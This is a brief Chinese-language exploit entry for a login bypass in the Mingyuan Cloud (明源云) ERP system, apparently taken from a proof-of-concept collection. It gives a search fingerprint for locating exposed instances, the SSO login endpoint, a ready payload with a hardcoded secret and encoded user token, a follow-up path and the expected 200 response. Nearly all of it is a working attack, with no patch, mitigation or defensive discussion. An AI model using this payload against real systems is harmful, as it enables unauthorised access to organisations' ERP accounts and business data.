# 明源云ERP系统存在登录绕过漏洞

明源云ERP系统 ｜ 其他 ｜ —
- **指纹**：`app="明源云-ERP"`
- **请求**：`POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1`

**Payload**
```
__yzsAppSecret=testtest&user_info=fymq5bIcxXZIxu6KllsFIR2ZwEJK%2BVE95Dkx%2FCnFgFQ%3D
/PubPlatform/nav/home/default?_nav=0000
```
- **响应特征**：200